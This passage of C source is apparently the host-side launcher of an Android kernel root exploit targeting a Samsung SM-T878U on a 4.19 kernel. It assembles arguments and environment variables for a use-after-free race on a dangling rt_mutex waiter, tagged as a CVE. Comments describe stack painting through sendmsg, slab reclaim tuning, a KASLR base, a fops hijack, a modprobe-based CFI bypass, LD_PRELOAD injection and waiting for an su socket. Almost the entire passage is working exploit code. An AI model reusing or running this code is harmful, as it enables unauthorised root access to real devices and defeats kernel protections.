               ? frameprobe_futex_uaddr_shift_value
               : "0");
  snprintf(frameprobe_futex_timeout_shift_arg,
           sizeof(frameprobe_futex_timeout_shift_arg),
           "--frameprobe-futex-timeout-shift=%s",
           frameprobe_futex_timeout_shift_value &&
                   *frameprobe_futex_timeout_shift_value
               ? frameprobe_futex_timeout_shift_value
               : "64");
  snprintf(frameprobe_futex_uaddr2_shift_arg,
           sizeof(frameprobe_futex_uaddr2_shift_arg),
           "--frameprobe-futex-uaddr2-shift=%s",
           frameprobe_futex_uaddr2_shift_value &&
                   *frameprobe_futex_uaddr2_shift_value
               ? frameprobe_futex_uaddr2_shift_value
               : "128");
  snprintf(frameprobe_futex_val3_arg, sizeof(frameprobe_futex_val3_arg),
           "--frameprobe-futex-val3=%s",
           frameprobe_futex_val3_value && *frameprobe_futex_val3_value
               ? frameprobe_futex_val3_value
               : "0");
  snprintf(frameprobe_futex_uaddr_word_arg,
           sizeof(frameprobe_futex_uaddr_word_arg),
           "--frameprobe-futex-uaddr-word=%s",
           frameprobe_futex_uaddr_word_value &&
                   *frameprobe_futex_uaddr_word_value
               ? frameprobe_futex_uaddr_word_value
               : "0");
  snprintf(frameprobe_futex_uaddr2_word_arg,
           sizeof(frameprobe_futex_uaddr2_word_arg),
           "--frameprobe-futex-uaddr2-word=%s",
           frameprobe_futex_uaddr2_word_value &&
                   *frameprobe_futex_uaddr2_word_value
               ? frameprobe_futex_uaddr2_word_value
               : "0x43495645");
  snprintf(frameprobe_ppoll_shift_arg, sizeof(frameprobe_ppoll_shift_arg),
           "--frameprobe-ppoll-shift=%s",
           frameprobe_ppoll_shift_value && *frameprobe_ppoll_shift_value
               ? frameprobe_ppoll_shift_value
               : "0");
  snprintf(frameprobe_ppoll_nfds_arg, sizeof(frameprobe_ppoll_nfds_arg),
           "--frameprobe-ppoll-nfds=%s",
           frameprobe_ppoll_nfds_value && *frameprobe_ppoll_nfds_value
               ? frameprobe_ppoll_nfds_value
               : "1");
  snprintf(frameprobe_ppoll_shape_arg, sizeof(frameprobe_ppoll_shape_arg),
           "--frameprobe-ppoll-shape=%s",
           frameprobe_ppoll_shape_value && *frameprobe_ppoll_shape_value
               ? frameprobe_ppoll_shape_value
               : "default");
  snprintf(sendmsg_name_shift_arg, sizeof(sendmsg_name_shift_arg),
           "--sendmsg-name-shift=%s",
           sendmsg_name_shift_value && *sendmsg_name_shift_value
               ? sendmsg_name_shift_value
               : "1");
  snprintf(sendmsg_name_shape_arg, sizeof(sendmsg_name_shape_arg),
           "--sendmsg-name-shape=%s",
           sendmsg_name_shape_value && *sendmsg_name_shape_value
               ? sendmsg_name_shape_value
               : "plain");
  snprintf(fake_waiter_head_mode_arg, sizeof(fake_waiter_head_mode_arg),
           "--fake-waiter-head-mode=%s",
           fake_waiter_head_mode_value && *fake_waiter_head_mode_value
               ? fake_waiter_head_mode_value
               : "fake-w0");
  snprintf(post_exit_delay_ms_arg, sizeof(post_exit_delay_ms_arg),
           "--post-exit-delay-ms=%s",
           post_exit_delay_ms_value && *post_exit_delay_ms_value
               ? post_exit_delay_ms_value
               : (probe_stage_value &&
                          strcmp(probe_stage_value, "waiter-exit-chainwalk") ==
                              0 &&
                      sendmsg_name_fake_waiter_shape
                      ? "100"
                      : "0"));
  snprintf(main_final_shape_arg, sizeof(main_final_shape_arg),
           "--main-final-shape=%s",
           main_final_shape_value && *main_final_shape_value
               ? main_final_shape_value
               : "none");
  snprintf(regspray_arg, sizeof(regspray_arg), "--regspray-value=%s",
           regspray_value && *regspray_value ? regspray_value : "0");
  snprintf(stacktag_arg, sizeof(stacktag_arg), "--stacktag-value=%s",
           stacktag_value && *stacktag_value ? stacktag_value : "0");
  if (frameprobe_select_shape_value && *frameprobe_select_shape_value &&
      strcmp(frameprobe_select_shape_value, "fake-waiter") == 0) {
    want_fake_waiter_head = 1;
  }
  if (frameprobe_ppoll_shape_value && *frameprobe_ppoll_shape_value &&
      strcmp(frameprobe_ppoll_shape_value, "fake-waiter") == 0) {
    want_fake_waiter_head = 1;
  }
  if (sendmsg_name_shape_value && *sendmsg_name_shape_value &&
      strcmp(sendmsg_name_shape_value, "fake-waiter") == 0) {
    want_fake_waiter_head = 1;
  }
  if ((!frameprobe_select_head_value || !*frameprobe_select_head_value) &&
      want_fake_waiter_head) {
    uint64_t fake_waiter_head = helper->fake_w0;
    if (fops_pi_rb_target_right && sendmsg_name_fake_waiter_shape) {
      /* q0 is also the parent used by the preparatory tree erase. */
      fake_waiter_head =
          p0_data_alias_const_u64(ASHMEM_MISC_FOPS) + 0x308ULL;
    }
    snprintf(frameprobe_select_head_arg, sizeof(frameprobe_select_head_arg),
             "--frameprobe-select-head=0x%016" PRIx64, fake_waiter_head);
  }
  if ((!stacktag_value || !*stacktag_value) &&
      ((frameprobe_select_shape_value && *frameprobe_select_shape_value &&
        strcmp(frameprobe_select_shape_value, "fake-waiter") == 0) ||
       (frameprobe_ppoll_shape_value && *frameprobe_ppoll_shape_value &&
        strcmp(frameprobe_ppoll_shape_value, "fake-waiter") == 0))) {
    snprintf(stacktag_arg, sizeof(stacktag_arg),
             "--stacktag-value=0x%016" PRIx64, helper->fake_lock);
  }
  snprintf(post_return_arg, sizeof(post_return_arg), "--waiter-post-return=%s",
           post_return_value);
  snprintf(adjust_pi_syscall_arg, sizeof(adjust_pi_syscall_arg),
           "--adjust-pi-syscall=%s", adjust_pi_syscall_value);
  snprintf(adjust_pi_policy_arg, sizeof(adjust_pi_policy_arg),
           "--adjust-pi-policy=%s", adjust_pi_policy_value);
  snprintf(adjust_pi_repeats_arg, sizeof(adjust_pi_repeats_arg),
           "--adjust-pi-repeats=%s",
           adjust_pi_repeats && *adjust_pi_repeats ? adjust_pi_repeats : "1");
  snprintf(isolated_hold_arg, sizeof(isolated_hold_arg),
           "--waiter-isolated-hold=%s", isolated_hold_value);
  argv[argc++] = (char *)REMOTE_PROBE;
  argv[argc++] = (char *)stage_flag;
  argv[argc++] = "--i-understand-this-may-panic";
  argv[argc++] = post_return_arg;
  if (waiter_timeout_value && *waiter_timeout_value) {
    argv[argc++] = waiter_timeout_arg;
  }
  if (!(skip_task && *skip_task && strcmp(skip_task, "0") != 0)) {
    argv[argc++] = task_arg;
  }
  if (!(skip_lock && *skip_lock && strcmp(skip_lock, "0") != 0)) {
    argv[argc++] = lock_arg;
  }
  argv[argc++] = watchdog_arg;
  argv[argc++] = hold_arg;
  argv[argc++] = opcode_arg;
  argv[argc++] = word3_arg;
  argv[argc++] = word4_arg;
  argv[argc++] = word5_arg;
  argv[argc++] = word6_arg;
  argv[argc++] = word7_arg;
  if (!skip_adjust_pi_enabled) {
    argv[argc++] = "--waiter-adjust-pi-after-post-return";
  }
  if (!skip_adjust_pi_enabled && adjust_pi_after_churn_enabled) {
    argv[argc++] = "--adjust-pi-after-churn";
  }
  argv[argc++] = adjust_pi_syscall_arg;
  argv[argc++] = adjust_pi_policy_arg;
  argv[argc++] = adjust_pi_repeats_arg;
  argv[argc++] = pre_chainwalk_arg;
  if (waiter_churn_value && *waiter_churn_value) {
    argv[argc++] = waiter_churn_arg;
  }
  if (quiet_waiter_churn_enabled) {
    argv[argc++] = "--quiet-waiter-churn";
  }
  if (stackshape_case_value && *stackshape_case_value) {
    argv[argc++] = stackshape_case_arg;
  }
  if (frameprobe_case_value && *frameprobe_case_value) {
    argv[argc++] = frameprobe_case_arg;
  }
  if (churn_iterations_value && *churn_iterations_value) {
    argv[argc++] = churn_iterations_arg;
  }
  if (churn_keep_fds_value && *churn_keep_fds_value) {
    argv[argc++] = churn_keep_fds_arg;
  }
  if (process_vm_mb_value && *process_vm_mb_value) {
    argv[argc++] = process_vm_mb_arg;
  }
  if (churn_progress_value && *churn_progress_value) {
    argv[argc++] = churn_progress_arg;
  }
  if (chainwalk_at_churn_iter_value && *chainwalk_at_churn_iter_value) {
    argv[argc++] = chainwalk_at_churn_iter_arg;
  }
  if (chainwalk_after_churn_enabled) {
    argv[argc++] = "--chainwalk-after-churn";
  }
  if (chainwalk_raw_final_enabled) {
    argv[argc++] = "--chainwalk-raw-final";
  }
  if (chainwalk_raw_timeout_ms_value && *chainwalk_raw_timeout_ms_value) {
    argv[argc++] = chainwalk_raw_timeout_ms_arg;
  }
  if (chainwalk_raw_val3_value && *chainwalk_raw_val3_value) {
    argv[argc++] = chainwalk_raw_val3_arg;
  }
  if (stack_marker_telemetry_value && *stack_marker_telemetry_value) {
    argv[argc++] = stack_marker_telemetry_arg;
  }
  if (frameprobe_select_shift_value && *frameprobe_select_shift_value) {
    argv[argc++] = frameprobe_select_shift_arg;
  }
  if (frameprobe_select_shape_value && *frameprobe_select_shape_value) {
    argv[argc++] = frameprobe_select_shape_arg;
  }
  if ((frameprobe_select_head_value && *frameprobe_select_head_value) ||
      want_fake_waiter_head) {
    argv[argc++] = frameprobe_select_head_arg;
  }
  if (frameprobe_futex_uaddr_shift_value &&
      *frameprobe_futex_uaddr_shift_value) {
    argv[argc++] = frameprobe_futex_uaddr_shift_arg;
  }
  if (frameprobe_futex_timeout_shift_value &&
      *frameprobe_futex_timeout_shift_value) {
    argv[argc++] = frameprobe_futex_timeout_shift_arg;
  }
  if (frameprobe_futex_uaddr2_shift_value &&
      *frameprobe_futex_uaddr2_shift_value) {
    argv[argc++] = frameprobe_futex_uaddr2_shift_arg;
  }
  if (frameprobe_futex_val3_value && *frameprobe_futex_val3_value) {
    argv[argc++] = frameprobe_futex_val3_arg;
  }
  if (frameprobe_futex_uaddr_word_value &&
      *frameprobe_futex_uaddr_word_value) {
    argv[argc++] = frameprobe_futex_uaddr_word_arg;
  }
  if (frameprobe_futex_uaddr2_word_value &&
      *frameprobe_futex_uaddr2_word_value) {
    argv[argc++] = frameprobe_futex_uaddr2_word_arg;
  }
  if (frameprobe_ppoll_shift_value && *frameprobe_ppoll_shift_value) {
    argv[argc++] = frameprobe_ppoll_shift_arg;
  }
  if (frameprobe_ppoll_nfds_value && *frameprobe_ppoll_nfds_value) {
    argv[argc++] = frameprobe_ppoll_nfds_arg;
  }
  if (frameprobe_ppoll_shape_value && *frameprobe_ppoll_shape_value) {
    argv[argc++] = frameprobe_ppoll_shape_arg;
  }
  if (sendmsg_name_shift_value && *sendmsg_name_shift_value) {
    argv[argc++] = sendmsg_name_shift_arg;
  }
  if (sendmsg_name_shape_value && *sendmsg_name_shape_value) {
    argv[argc++] = sendmsg_name_shape_arg;
  }
  if ((fake_waiter_head_mode_value && *fake_waiter_head_mode_value) ||
      (fops_pi_rb_target_right && sendmsg_name_fake_waiter_shape)) {
    argv[argc++] = fake_waiter_head_mode_arg;
  }
  if (post_exit_delay_ms_value && *post_exit_delay_ms_value) {
    argv[argc++] = post_exit_delay_ms_arg;
  }
  if (main_final_shape_value && *main_final_shape_value) {
    argv[argc++] = main_final_shape_arg;
  }
  if (regspray_value && *regspray_value) {
    argv[argc++] = regspray_arg;
  }
  if ((stacktag_value && *stacktag_value) ||
      (frameprobe_select_shape_value && *frameprobe_select_shape_value &&
       strcmp(frameprobe_select_shape_value, "fake-waiter") == 0)) {
    argv[argc++] = stacktag_arg;
  }
  argv[argc++] = isolated_hold_arg;
  /*
   * The isolated-hold gate only works for post-return modes that publish
   * waiter_active_hold_started before they block in-kernel. Fast-return modes
   * like io-submit-usercopy / pipe-read-io-submit never raise that flag, so
   * forcing --adjust-pi-start-isolated-hold there only adds false 2s timeouts
   * before the real adjust-pi trigger.  Likewise, skip-adjust-pi idle probes
   * must not strand the waiter in the hold loop after the probe already ended.
   */
  int adjust_pi_start_hold_disabled =
      adjust_pi_start_hold_value && *adjust_pi_start_hold_value &&
      strcmp(adjust_pi_start_hold_value, "0") == 0;
  int adjust_pi_start_hold_forced =
      adjust_pi_start_hold_value && *adjust_pi_start_hold_value &&
      strcmp(adjust_pi_start_hold_value, "0") != 0;
  int pselect320_isolated_hold =
      strcmp(isolated_hold_value, "select320") == 0 ||
      strcmp(isolated_hold_value, "pselect320") == 0;
  if (!skip_adjust_pi_enabled && post_return_supports_adjust_pi_start_hold &&
      !adjust_pi_start_hold_disabled &&
      !(pselect320_isolated_hold && !adjust_pi_start_hold_forced)) {
    argv[argc++] = "--adjust-pi-start-isolated-hold";
  } else if (!skip_adjust_pi_enabled && post_return_supports_adjust_pi_start_hold &&
             !adjust_pi_start_hold_disabled && pselect320_isolated_hold &&
             !adjust_pi_start_hold_forced) {
    fprintf(stderr,
            "[reroot] suppress auto --adjust-pi-start-isolated-hold for "
            "waiter-isolated-hold=%s: on SM-T878U this makes sched_setparam "
            "run while the compat select stack overlay is live and it rebooted "
            "the 4.19 tree in live tests before any fops hijack landed. "
            "Set IONSTACK_PROBE_ADJUST_PI_START_HOLD=1 to override.\n",
            isolated_hold_value);
  }
  argv[argc++] = idle_arg;
  argv[argc] = NULL;

  /*
   * spawn_child() clears the environment, so probe-only diagnostics that rely
   * on runtime env checks (for example the idle-window stack scanner) must be
   * forwarded explicitly here.
   */
  struct env_pair environment[8];
  size_t env_count = 0;
  if (target && target->kaslr_base) {
    environment[env_count++] =
        (struct env_pair){"IONSTACK_KASLR_BASE", kaslr_value};
  }
  append_env_override(environment, &env_count,
                      sizeof(environment) / sizeof(environment[0]),
                      "IONSTACK_PROBE_SCAN_DURING_IDLE");
  append_env_override(environment, &env_count,
                      sizeof(environment) / sizeof(environment[0]),
                      "IONSTACK_SCAN_DEBUG");
  append_env_override(environment, &env_count,
                      sizeof(environment) / sizeof(environment[0]),
                      "IONSTACK_SCAN_COMM_PREFIX");

  return spawn_child(child, REMOTE_PROBE, argv, environment, env_count);
}

static int spawn_pselect_root(struct child_proc *child,
                              const struct target_state *target) {
  char kaslr_value[32];
  snprintf(kaslr_value, sizeof(kaslr_value), "0x%016" PRIx64,
           target->kaslr_base);
  const char *unsafe_consume = getenv("IONSTACK_ALLOW_UNSAFE_CONSUME");
  const char *skip_override = getenv("IONSTACK_SKIP_CONSUME");
  const char *fops_pi_waiters = getenv("IONSTACK_FOPS_PI_WAITERS");
  const char *fops_pi_leftmost = getenv("IONSTACK_FOPS_PI_LEFTMOST");
  const char *fops_pi_node_safe = getenv("IONSTACK_FOPS_PI_NODE_SAFE");
  const char *fops_pi_rb_shape = getenv("IONSTACK_FOPS_PI_RB_SHAPE");
  const char *fops_lock_owner_mode = getenv("IONSTACK_FOPS_LOCK_OWNER_MODE");
  const char *fops_lock_waiters = getenv("IONSTACK_FOPS_LOCK_WAITERS");
  const char *fops_wait_lock_word = getenv("IONSTACK_FOPS_WAIT_LOCK_WORD");
  const char *pselect_prio = getenv("IONSTACK_PSELECT_PRIO");
  const char *pselect_tree_mode = getenv("IONSTACK_PSELECT_TREE_MODE");
  const char *pselect_task = getenv("IONSTACK_PSELECT_TASK");
  const char *pselect_paint_tree = getenv("IONSTACK_PSELECT_PAINT_TREE");
  const char *pselect_hold_fd = getenv("IONSTACK_PSELECT_HOLD_FD");
  const char *pselect_stall = getenv("IONSTACK_PSELECT_STALL");
  const char *pselect_consume_when = getenv("IONSTACK_PSELECT_CONSUME_WHEN");
  const char *pselect_consume_spin = getenv("IONSTACK_PSELECT_CONSUME_SPIN");
  const char *pselect_skip = getenv("IONSTACK_PSELECT_SKIP");
  const char *pselect_fill_all = getenv("IONSTACK_PSELECT_FILL_ALL");
  const char *pselect_word_bias =
      getenv("IONSTACK_PSELECT_WAITER_WORD_BIAS");
  const char *pselect_lock_word = getenv("IONSTACK_PSELECT_LOCK_WORD");
  const char *pselect_diag = getenv("IONSTACK_PSELECT_DIAG");
  const char *pselect_word_shift = getenv("IONSTACK_PSELECT_WORD_SHIFT");
  const char *route_hold = getenv("IONSTACK_ROUTE_HOLD");
  const char *route_rearm = getenv("IONSTACK_ROUTE_REARM");
  const char *rearm_fire = getenv("IONSTACK_REARM_FIRE");
  const char *w_nice = getenv("IONSTACK_W_NICE");
  const char *owner_lock_timeout_ms = getenv("IONSTACK_OWNER_LOCK_TIMEOUT_MS");
  const char *helper_nice = getenv("IONSTACK_HELPER_NICE");
  const char *r_nice = getenv("IONSTACK_R_NICE");
  const char *consumer_nice = getenv("IONSTACK_CONSUMER_NICE");
  const char *consumer_real_nice = getenv("IONSTACK_CONSUMER_REAL_NICE");
  const char *hold_probe_ms = getenv("IONSTACK_HOLD_PROBE_MS");
  /*
   * Section 15 stack-paint route (RTMUTEX_WEAPONIZATION.md section 15).
   * W repaints its own residual rt_mutex_waiter at SP0-0x190 with a blocking
   * sendmsg() whose msg_namelen=0x28 / msg_iovlen=1 land waiter->lock and
   * waiter->prio exactly.
   */
  const char *sendmsg_paint = getenv("IONSTACK_SENDMSG_PAINT");
  const char *paint_sndbuf = getenv("IONSTACK_PAINT_SNDBUF");
  const char *paint_probe_ms = getenv("IONSTACK_PAINT_PROBE_MS");
  const char *paint_settle_ms = getenv("IONSTACK_PAINT_SETTLE_MS");
  /* Section 15.16 paint-landed oracle: default 0x7fffffff (weapon setting).
     Set to W's prio (121) to make rtmutex.c:1135 bail out before
     waiter->lock is read, so the run survives iff the paint landed. */
  const char *paint_prio = getenv("IONSTACK_PAINT_PRIO");
  /* 1 = fill the whole sockaddr_storage with prio (offset-agnostic probe). */
  const char *paint_fill = getenv("IONSTACK_PAINT_FILL");
  const char *insert_target_off = getenv("IONSTACK_INSERT_TARGET_OFF");
  const char *insert_value_off = getenv("IONSTACK_INSERT_VALUE_OFF");
  const char *effective_owner_mode =
      effective_t878u_lock_owner_mode(fops_lock_owner_mode);
  (void)effective_owner_mode;
  /*
   * Res-race installer path (CVE-2026-43499 dangling pi_blocked_on):
   * default to arming sched_setattr consumption.  Set
   * IONSTACK_SKIP_CONSUME=1 for survival-only zeroing runs.
   */
  const char *skip_consume =
      skip_override && *skip_override
          ? skip_override
          : (unsafe_consume && *unsafe_consume &&
                     strcmp(unsafe_consume, "0") == 0
                 ? "1"
                 : "0");
  struct env_pair environment[] = {
      {"IONSTACK_STAGE", "t878u-pselect-root"},
      {"IONSTACK_CFI_ROUTE", "writeonly-modprobe"},
      {"IONSTACK_KASLR_BASE", kaslr_value},
      {"IONSTACK_SKIP_CONSUME", skip_consume},
      {"IONSTACK_PSELECT_ROUTE_ATTEMPTS", "4"},
      {"IONSTACK_PSELECT_HAMMER", "512"},
      {"IONSTACK_PSELECT_DELAY_US", "0"},
      {"IONSTACK_PSELECT_PRIO",
       pselect_prio && *pselect_prio ? pselect_prio : "130"},
      {"IONSTACK_PSELECT_TREE_MODE",
       pselect_tree_mode && *pselect_tree_mode ? pselect_tree_mode : "default"},
      {"IONSTACK_PSELECT_TASK",
       pselect_task && *pselect_task ? pselect_task : "slide-init"},
      {"IONSTACK_PSELECT_PAINT_TREE",
       pselect_paint_tree && *pselect_paint_tree ? pselect_paint_tree : "1"},
      {"IONSTACK_PSELECT_HOLD_FD",
       pselect_hold_fd && *pselect_hold_fd ? pselect_hold_fd : "1"},
      {"IONSTACK_PSELECT_STALL",
       pselect_stall && *pselect_stall ? pselect_stall : "0"},
      {"IONSTACK_PSELECT_CONSUME_WHEN",
       pselect_consume_when && *pselect_consume_when ? pselect_consume_when
                                                     : "post"},
      {"IONSTACK_PSELECT_CONSUME_SPIN",
       pselect_consume_spin && *pselect_consume_spin ? pselect_consume_spin
                                                     : "8000000"},
      {"IONSTACK_PSELECT_SKIP",
       pselect_skip && *pselect_skip ? pselect_skip : "0"},
      {"IONSTACK_PSELECT_FILL_ALL",
       pselect_fill_all && *pselect_fill_all ? pselect_fill_all : "0"},
      {"IONSTACK_PSELECT_WAITER_WORD_BIAS",
       pselect_word_bias && *pselect_word_bias ? pselect_word_bias : "0"},
      {"IONSTACK_PSELECT_LOCK_WORD",
       pselect_lock_word && *pselect_lock_word ? pselect_lock_word : "7"},
      {"IONSTACK_PSELECT_DIAG",
       pselect_diag && *pselect_diag ? pselect_diag : ""},
      {"IONSTACK_PSELECT_WORD_SHIFT",
       pselect_word_shift && *pselect_word_shift ? pselect_word_shift : "16"},
      {"IONSTACK_CONSUMER_MAX_CALLS", "128"},
      {"IONSTACK_CONSUMER_BURST_CALLS", "32"},
      {"IONSTACK_CONSUMER_STABLE_NICE", "1"},
      /*
       * HOLD oracle (docs/PSELECT_GEOMETRY_FINDINGS.md §9): keep the waiter
       * thread blocked inside FUTEX_WAIT_REQUEUE_PI instead of running the
       * pselect route, so the residual rt_waiter at SP0-0x190 is never clobbered
       * by ret_to_user/do_notify_resume.  CONSUMER_REAL_NICE makes the consumer
       * move the waiter's ->prio away from the residual waiter->prio so
       * rt_mutex_adjust_pi() does not early-out.
       */
      {"IONSTACK_ROUTE_HOLD",
       route_hold && *route_hold ? route_hold : "0"},
      /*
       * B1 re-arm oracle: FUTEX_LOCK_PI(&f_rearm) from the requeue task so
       * alloc_pi_state() pulls the cached futex_pi_state back out and we get
       * to choose pi_mutex.owner.  Needs helper nice > consumer nice because
       * rt_mutex_setprio() is min(p->normal_prio, pi_task->prio).
       */
      {"IONSTACK_ROUTE_REARM",
       route_rearm && *route_rearm ? route_rearm : "0"},
      /*
       * Section 15 stack-paint route.  When IONSTACK_SENDMSG_PAINT=1 the waiter
       * thread, instead of spinning after FUTEX_WAIT_REQUEUE_PI returns, issues
       * a blocking sendmsg() on an AF_UNIX SOCK_SEQPACKET pair whose sndbuf is
       * pre-filled; ___sys_sendmsg()'s two unchecked copies then repaint
       * waiter+0x28..waiter+0x50 (lock=fake_lock, prio=0x7fffffff) while the
       * frame stays alive.  Requires IONSTACK_ROUTE_HOLD=1 (so the requeue
       * returns -EDEADLK and the residual waiter survives) and
       * IONSTACK_REARM_FIRE=sched (so the consumer drives rt_mutex_adjust_pi).
       * IONSTACK_INSERT_TARGET_OFF additionally arms the rb_insert Case 3
       * write gate; both it and VALUE_OFF are payload-page offsets.
       */
      {"IONSTACK_SENDMSG_PAINT",
       sendmsg_paint && *sendmsg_paint ? sendmsg_paint : "0"},
      {"IONSTACK_PAINT_SNDBUF",
       paint_sndbuf && *paint_sndbuf ? paint_sndbuf : "4096"},
      {"IONSTACK_PAINT_PROBE_MS",
       paint_probe_ms && *paint_probe_ms ? paint_probe_ms : "30000"},
      {"IONSTACK_PAINT_SETTLE_MS",
       paint_settle_ms && *paint_settle_ms ? paint_settle_ms : "300"},
      {"IONSTACK_PAINT_PRIO",
       paint_prio && *paint_prio ? paint_prio : "2147483647"},
      {"IONSTACK_PAINT_FILL",
       paint_fill && *paint_fill ? paint_fill : "0"},
      {"IONSTACK_INSERT_TARGET_OFF",
       insert_target_off && *insert_target_off ? insert_target_off : "0"},
      {"IONSTACK_INSERT_VALUE_OFF",
       insert_value_off && *insert_value_off ? insert_value_off : "0"},
      /*
       * Design-G trigger selector, tri-state:
       *   "none"   (default) -- the consumer fires nothing; the chain walk is
       *            driven purely by M's own deterministic
       *            IONSTACK_OWNER_LOCK_TIMEOUT_MS hrtimer.  Cleanest
       *            attribution: any observed priority change must have come
       *            from remove_waiter()'s MIN_CHAINWALK.
       *   "signal" -- the consumer tgkills M (SIGUSR1/SIGUSR2/SIGRTMIN+4).
       *   "sched"  -- the consumer sched_setattr()s W (legacy route).
       * IONSTACK_W_NICE must be > 0 so W->normal_prio != 120 and the de-boost
       * separates W_waiter->prio (120) from W->prio (121).
       */
      {"IONSTACK_REARM_FIRE",
       rearm_fire && *rearm_fire ? rearm_fire : "none"},
      {"IONSTACK_W_NICE", w_nice && *w_nice ? w_nice : "1"},
      {"IONSTACK_OWNER_LOCK_TIMEOUT_MS",
       owner_lock_timeout_ms && *owner_lock_timeout_ms ? owner_lock_timeout_ms
                                                      : "2500"},
      {"IONSTACK_HELPER_NICE",
       helper_nice && *helper_nice ? helper_nice : "19"},
      {"IONSTACK_R_NICE", r_nice && *r_nice ? r_nice : "5"},
      {"IONSTACK_CONSUMER_NICE",
       consumer_nice && *consumer_nice ? consumer_nice : "19"},
      {"IONSTACK_CONSUMER_REAL_NICE",
       consumer_real_nice && *consumer_real_nice ? consumer_real_nice : "0"},
      {"IONSTACK_HOLD_PROBE_MS",
       hold_probe_ms && *hold_probe_ms ? hold_probe_ms : "2000"},
      {"IONSTACK_PAGE_SETUP_ATTEMPTS", "96"},
      {"IONSTACK_KS_COLLISIONS", "8"},
      {"IONSTACK_KS_THREADS", "8"},
      {"IONSTACK_RECLAIM_CORE", "1"},
      {"IONSTACK_RECLAIM_PARTIAL_SLABS", "18"},
      {"IONSTACK_RECLAIM_SPLICE_ORDER_GATE", "1"},
      {"IONSTACK_RECLAIM_REQUIRE_ORDER3", "0"},
      {"IONSTACK_RECLAIM_PFN_IDENTITY", "0"},
      {"IONSTACK_RECLAIM_RELEASE_PREPARE_EARLY", "1"},
      {"IONSTACK_RECLAIM_TARGET_LAST", "1"},
      {"IONSTACK_RECLAIM_PRETARGET_SENDS", "0"},
      {"IONSTACK_RECLAIM_PRETARGET_HOLD", "1"},
      {"IONSTACK_RECLAIM_PRETARGET_LATE", "1"},
      {"IONSTACK_RECLAIM_POSTTARGET_SEARCH", "1"},
      {"IONSTACK_RECLAIM_POSTTARGET_SENDS", "8192"},
      {"IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS", "32"},
      {"IONSTACK_RECLAIM_VALIDATE_CONTENT", "1"},
      {"IONSTACK_RECLAIM_REQUIRE_CONTENT", "1"},
      {"IONSTACK_FOPS_PI_WAITERS",
       fops_pi_waiters && *fops_pi_waiters ? fops_pi_waiters : "0"},
      {"IONSTACK_FOPS_PI_LEFTMOST",
       fops_pi_leftmost && *fops_pi_leftmost ? fops_pi_leftmost : "1"},
      {"IONSTACK_FOPS_PI_NODE_SAFE",
       fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"},
      {"IONSTACK_FOPS_PI_RB_SHAPE",
       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"},
      /*
       * Owner mode was hardcoded to "none" together with
       * IONSTACK_T878U_ALLOW_OWNERLESS_PI=1.  That combination is exactly
       * what effective_t878u_lock_owner_mode() clamps away, because an
       * ownerless rt_mutex_adjust_prio_chain walks into
       * rt_mutex_top_waiter(lock)'s BUG_ON(w->lock != lock) on this 4.19
       * tree.  Hardcoding both meant the clamp was computed and then
       * discarded (see the (void)effective_owner_mode above), so the route
       * always ran the configuration the code documents as crashing.
       *
       * Honour the host env so the three configurations can be compared
       * without a rebuild; default to the clamp's answer ("init-task").
       */
      {"IONSTACK_FOPS_LOCK_OWNER_MODE",
       effective_t878u_lock_owner_mode(fops_lock_owner_mode)},
      {"IONSTACK_T878U_ALLOW_OWNERLESS_PI",
       env_truthy_name("IONSTACK_T878U_ALLOW_OWNERLESS_PI") ? "1" : "0"},
      {"IONSTACK_FOPS_LOCK_WAITERS",
       fops_lock_waiters && *fops_lock_waiters ? fops_lock_waiters : "1"},
      {"IONSTACK_FOPS_WAIT_LOCK_WORD",
       fops_wait_lock_word && *fops_wait_lock_word ? fops_wait_lock_word
                                                   : "0"},
      {"LD_PRELOAD", REMOTE_PRELOAD},
  };
  char *argv[] = {"/system/bin/toybox", "true", NULL};
  return spawn_child(child, argv[0], argv, environment,
                     sizeof(environment) / sizeof(environment[0]));
}

static void pselect_root_line(const char *line, void *user) {
  struct capture_state *state = user;
  const char *result = strstr(line, "stage-t878u-pselect-root-result ");
  if (!result) {
    result = strstr(line, "stage-t878u-writeonly-modprobe-result ");
  }
  if (result) {
    int pid = 0;
    int ok = 0;
    if (sscanf(result, "stage-t878u-pselect-root-result pid=%d ok=%d", &pid,
               &ok) == 2 ||
        sscanf(result, "stage-t878u-writeonly-modprobe-result pid=%d ok=%d",
               &pid, &ok) == 2) {
      state->saw_result = 1;
      state->ok = ok != 0;
      state->restore_ok = ok != 0;
      state->su_ready = access(REMOTE_SOCKET, F_OK) == 0;
    }
  }
  if (strstr(line, "modprobe-su-ready ")) {
    state->su_ready = 1;
  }
}

static int wait_pselect_root(struct child_proc *child,
                             struct capture_state *state) {
  uint64_t deadline = monotonic_ms() + CAPTURE_TIMEOUT_MS;
  while (!stop_requested && monotonic_ms() < deadline) {
    if (child->fd >= 0) {
      struct pollfd pfd = {.fd = child->fd, .events = POLLIN | POLLHUP};
      poll(&pfd, 1, 250);
    } else {
      sleep_ms(25);
    }
    drain_child(child, pselect_root_line, state);
    reap_child(child);
    if (state->saw_result && state->ok && state->su_ready) {
      return 0;
    }
    if (child->exited && child->fd < 0) {
      return state->ok ? 0 : -1;
    }
  }
  return -1;
}

static int __attribute__((unused)) wait_captures_and_probe(struct child_proc *captures,
                                   struct capture_state *capture_states,
                                   size_t capture_count,
                                   struct child_proc *probe,
                                   struct child_proc *holder,
                                   struct helper_state *helper_state) {
  uint64_t deadline = monotonic_ms() + CAPTURE_TIMEOUT_MS;
  while (!stop_requested && monotonic_ms() < deadline) {
    struct pollfd pollfds[CAPTURE_WORKERS + 2];
    nfds_t count = 0;
    for (size_t i = 0; i < capture_count; ++i) {
      if (captures[i].fd >= 0) {
        pollfds[count++] = (struct pollfd){.fd = captures[i].fd,
                                           .events = POLLIN | POLLHUP};
      }
    }
    if (holder && holder->fd >= 0) {
      pollfds[count++] =
          (struct pollfd){.fd = holder->fd, .events = POLLIN | POLLHUP};
    }
    if (probe->fd >= 0) {
      pollfds[count++] =
          (struct pollfd){.fd = probe->fd, .events = POLLIN | POLLHUP};
    }
    if (count > 0) {
      poll(pollfds, count, 250);
    } else {
      sleep_ms(25);
    }
    int any_success = 0;
    int all_captures_exited = 1;
    for (size_t i = 0; i < capture_count; ++i) {
      drain_child(&captures[i], capture_line, &capture_states[i]);
      reap_child(&captures[i]);
      if (!captures[i].exited || captures[i].fd >= 0) {
        all_captures_exited = 0;
      }
      if (capture_states[i].saw_result && capture_states[i].ok &&
          capture_states[i].restore_ok) {
        any_success = 1;
